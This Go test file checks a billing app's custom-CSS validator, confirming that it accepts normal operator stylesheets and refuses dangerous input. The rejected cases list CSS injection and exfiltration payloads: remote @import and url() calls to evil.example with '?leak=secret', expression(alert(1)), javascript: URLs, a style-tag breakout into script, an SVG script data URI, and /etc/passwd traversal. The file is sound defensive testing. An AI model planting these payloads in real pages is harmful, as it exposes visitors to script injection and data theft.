package theme_test

import (
	"strings"
	"testing"

	"github.com/catalyst/billing/internal/theme"
)

// The two identifier shapes the url() allowlist accepts: a stored theme asset and a catalog image.
// Both are digest/UUID addressed, which is the property that makes them safe — an attacker cannot
// append a secret to the query string of a path that does not exist.
const (
	assetUUID = "0f0e0d0c-0b0a-4908-8706-050403020100"
	mediaUUID = "1a2b3c4d-5e6f-4a8b-9c0d-1e2f3a4b5c6d"
)

// Custom CSS is a parser, not a filter, so the first thing it has to do is accept the stylesheet an
// operator actually writes. If the accepted set were narrower than real designs, operators would go
// back to the game panel's unvalidated field and the security boundary would be bypassed by policy
// rather than by code.
func TestCustomCSSAcceptsTheStylesheetAnOperatorWouldWrite(t *testing.T) {
	accepted := []struct{ name, css string }{
		{
			"a plain rule",
			`.card { color: #ffffff; background: #1e1a18; }`,
		},
		{
			"a custom property declaration",
			`:root { --brand-line: 1px solid #37322e; }`,
		},
		{
			"a selector with an attribute, a pseudo-class and a quoted string",
			`a[href^="https"]:hover { color: #ff951e; }`,
		},
		{
			"an @media block",
			`@media (min-width: 768px) { .card { padding: 16px; } }`,
		},
		{
			"an @supports block",
			`@supports (display: grid) { .grid { display: grid; } }`,
		},
		{
			"an @media nested inside an @supports",
			`@supports (display: grid) { @media (min-width: 768px) { .grid { gap: 12px; } } }`,
		},
		{
			"an @keyframes block",
			`@keyframes fade-in { from { opacity: 0; } to { opacity: 1; } }`,
		},
		{
			"a vendor-prefixed @keyframes block",
			`@-webkit-keyframes fade-in { from { opacity: 0; } to { opacity: 1; } }`,
		},
		{
			"an @font-face served from the asset route",
			`@font-face { font-family: Inter; src: url(/theme/assets/` + assetUUID + `) format("woff2"); }`,
		},
		{
			"an @layer block and its statement form",
			`@layer base; @layer components { .card { border-radius: 0; } }`,
		},
		{
			"a comment before a rule",
			`/* operator note: flat cards */ .card { border-radius: 0; }`,
		},
		{
			"a comment between declarations",
			`.card { color: #ffffff; /* hairline */ border: 1px solid #37322e; }`,
		},
		{
			"a string that contains a comment opener",
			`.card::after { content: "/* not a comment */"; }`,
		},
		{
			"a string that contains a semicolon",
			`.card::after { content: "a;b"; }`,
		},
		{
			"a quoted url() from the catalog media route",
			`.hero { background-image: url("/api/v1/media/` + mediaUUID + `"); }`,
		},
		{
			"an unquoted url() from the asset route",
			`.hero { background-image: url(/theme/assets/` + assetUUID + `); }`,
		},
		{
			"a base64 png data URI",
			`.hero { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="); }`,
		},
	}

	for _, c := range accepted {
		t.Run("accepts "+c.name, func(t *testing.T) {
			if err := theme.ValidateCustomCSS(c.css); err != nil {
				t.Fatalf("valid custom CSS was refused: %v\n%s", err, c.css)
			}
		})
	}
}

// The rejected corpus is the security contract. Each entry is a construct that either executes
// script, loads a document the operator did not author, or leaks a value from the page — the four
// ways a "custom CSS" field becomes a vulnerability. The `want` fragment is checked so a refusal for
// the wrong reason (an unrelated parse failure) cannot pass for a refusal of the dangerous thing.
func TestCustomCSSRefusesScriptLoadAndExfiltration(t *testing.T) {
	rejected := []struct{ name, css, want string }{
		// -- request mechanisms --------------------------------------------------------------
		{
			"an @import of a remote stylesheet",
			`@import url(https://evil.example/x.css);`,
			"@import",
		},
		{
			"an @import as a bare string",
			`@import "x.css";`,
			"@import",
		},
		{
			"an @import spelled with a CSS escape",
			`@\69mport url(x.css);`,
			"escape",
		},
		{
			"an @charset that would rewrite the document encoding",
			`@charset "utf-8";`,
			"@charset",
		},
		{
			"an @namespace that would rebind selector names",
			`@namespace svg url(http://www.w3.org/2000/svg);`,
			"@namespace",
		},
		{
			"a non-permitted at-rule",
			`@property --x { syntax: "*"; inherits: false; }`,
			"@property",
		},

		// -- script execution ----------------------------------------------------------------
		{
			"expression() in a declaration",
			`.a { width: expression(alert(1)); }`,
			"expression(",
		},
		{
			"expression() spelled with an escape",
			`.a { width: e\78pression(alert(1)); }`,
			"escape",
		},
		{
			"behavior: which loads an external script",
			`.a { behavior: url(x.htc); }`,
			"behavior:",
		},
		{
			"-moz-binding: which loads external XBL",
			`.a { -moz-binding: url(x.xml); }`,
			"-moz-binding:",
		},
		{
			"a javascript: URL",
			`.a { background: url(javascript:alert(1)); }`,
			"javascript:",
		},
		{
			"a closing style tag that would escape the stylesheet",
			`</style><script>alert(1)</script>`,
			"<",
		},

		// -- arbitrary requests / exfiltration -----------------------------------------------
		{
			"an absolute url() to a foreign origin",
			`.a { background: url(https://evil.example/?leak=secret); }`,
			"url(",
		},
		{
			"a protocol-relative url()",
			`.a { background: url(//evil.example/x); }`,
			"url(",
		},
		{
			"a url() through image-set()",
			`.a { background: image-set(url(https://evil.example/x) 1x); }`,
			"image-set(",
		},
		{
			"a url() through -webkit-image-set()",
			`.a { background: -webkit-image-set(url(https://evil.example/x) 1x); }`,
			"image-set(",
		},
		{
			"a font loaded from a protocol-relative URL",
			`@font-face { src: url(//evil.example/f.woff2); }`,
			"url(",
		},
		{
			"content: url() which would fetch per visitor",
			`.a::before { content: url(x); }`,
			"url(",
		},
		{
			"an SVG data URI, which can carry a script",
			`.a { background: url(data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pjwvc2NyaXB0Pjwvc3ZnPg==); }`,
			"url(",
		},
		{
			"an asset path that escapes the asset route",
			`.a { background: url(/theme/assets/../../etc/passwd); }`,
			"url(",
		},
		{
			"an asset URL carrying a query string",
			`.a { background: url(/theme/assets/` + assetUUID + `?leak=secret); }`,
			"url(",
		},
		{
			"a url() in an at-rule prelude",
			`@media url(x) { .a { color: #ffffff; } }`,
			"url(",
		},

		// -- structural failures -------------------------------------------------------------
		{
			"an unterminated comment",
			`.a { color: #ffffff; } /* never closed`,
			"unterminated comment",
		},
		{
			"an unterminated string",
			`.a { content: "abc; }`,
			"unterminated string",
		},
		{
			"an unmatched closing brace",
			`.a { color: #ffffff; } }`,
			"unmatched",
		},
		{
			"an unclosed block",
			`.a { color: #ffffff;`,
			"unclosed",
		},
		{
			"a block nested past the depth limit",
			`@media a { @supports b { @media c { @supports d { .x { color: #ffffff; } } } } }`,
			"nests deeper",
		},
		{
			"a statement outside any rule",
			`color: #ffffff;`,
			"statement outside",
		},
		{
			"an empty selector",
			`{ color: #ffffff; }`,
			"empty selector",
		},
		{
			"an empty declaration value",
			`.a { color: ; }`,
			"empty value",
		},
		{
			"a malformed declaration",
			`.a { color #ffffff; }`,
			"malformed declaration",
		},
	}

	for _, c := range rejected {
		t.Run("refuses "+c.name, func(t *testing.T) {
			err := theme.ValidateCustomCSS(c.css)
			if err == nil {
				t.Fatalf("dangerous custom CSS was accepted:\n%s", c.css)
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Fatalf("the error does not mention %q, so it may be refusing the wrong thing: %v", c.want, err)
			}
		})
	}
}

// The size limit is checked before any scanning: a 300 KiB paste must be refused in constant time,
// because the parse bounds only help if reaching them is cheap.
func TestCustomCSSRefusesAnOversizedStylesheet(t *testing.T) {
	const rule = ".a{color:#ffffff}\n"
	css := strings.Repeat(rule, theme.MaxCustomCSSBytes/len(rule)+1)
	if len(css) <= theme.MaxCustomCSSBytes {
		t.Fatalf("the test stylesheet is only %d bytes; it must exceed %d", len(css), theme.MaxCustomCSSBytes)
	}
	err := theme.ValidateCustomCSS(css)
	if err == nil {
		t.Fatal("a stylesheet over MaxCustomCSSBytes was accepted")
	}
	if !strings.Contains(err.Error(), "limit") {
		t.Fatalf("the error does not mention the limit: %v", err)
	}
}

// Custom CSS is validated on the document path too, not only when a caller remembers to check it:
// a theme whose block skipped validation is a theme that can be published and then served, which is
// the exact failure the package comment says must not be possible.
func TestDocumentValidationRunsTheCustomCSSValidator(t *testing.T) {
	doc := theme.Default()
	doc.CustomCSS = `@import url(https://evil.example/x.css);`
	err := theme.Validate(doc)
	if err == nil {
		t.Fatal("Validate accepted a document whose customCss contains @import")
	}
	if !strings.Contains(err.Error(), "@import") {
		t.Fatalf("the error does not name the construct: %v", err)
	}

	t.Run("a valid block is accepted", func(t *testing.T) {
		doc := theme.Default()
		doc.CustomCSS = `.card { border-radius: 0; }`
		if err := theme.Validate(doc); err != nil {
			t.Fatalf("a valid customCss block was refused: %v", err)
		}
	})

	t.Run("an oversized block is refused before parsing", func(t *testing.T) {
		doc := theme.Default()
		const rule = ".a{color:#ffffff}\n"
		doc.CustomCSS = strings.Repeat(rule, theme.MaxCustomCSSBytes/len(rule)+1)
		if err := theme.Validate(doc); err == nil {
			t.Fatal("a document with an oversized customCss block was accepted")
		}
	})
}
